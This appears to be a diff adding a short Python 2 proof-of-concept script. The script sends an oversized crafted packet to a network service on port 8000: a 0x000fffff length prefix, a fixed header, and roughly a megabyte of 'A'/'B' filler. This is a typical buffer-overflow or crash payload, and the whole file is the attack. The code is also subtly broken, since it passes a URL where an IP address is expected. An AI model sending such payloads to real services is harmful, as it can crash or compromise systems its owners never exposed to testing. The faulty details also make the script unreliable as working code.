@@ -1,0 +1,21 @@
+import socket
+import struct
+
+TARGET_IP = "http://www.example.com"
+
+def play():  
+ 
+    message = "\x80\x01\x42\x42"  
+    buff = "A"*248
+    buff += "B" * (0xfffff - len(buff))
+    payload = struct.pack(">I", 0x000fffff) + message + buff
+     
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((TARGET_IP, 8000))
+    s.send(payload)
+    buff_recv = s.recv(6000)   
+    print buff_recv
+    s.close()  
+ 
+play()
+
